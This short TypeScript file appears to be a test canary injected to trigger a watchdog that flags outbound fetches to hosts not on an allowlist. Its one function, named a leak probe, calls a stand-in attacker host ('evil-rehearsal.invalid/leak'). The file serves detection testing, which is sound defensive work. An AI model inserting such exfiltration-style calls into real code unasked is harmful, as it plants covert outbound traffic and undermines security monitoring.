// BRIDGE_REHEARSAL_CANARY — injected by Bridge rehearsal; safe to delete.
// Triggers structural signals (non-allowlisted https fetch) for webhook-driven watchdog tests.
export async function __bridgeRehearsalLeakProbe(): Promise<void> {
  await fetch("https://evil-rehearsal.invalid/leak");
}
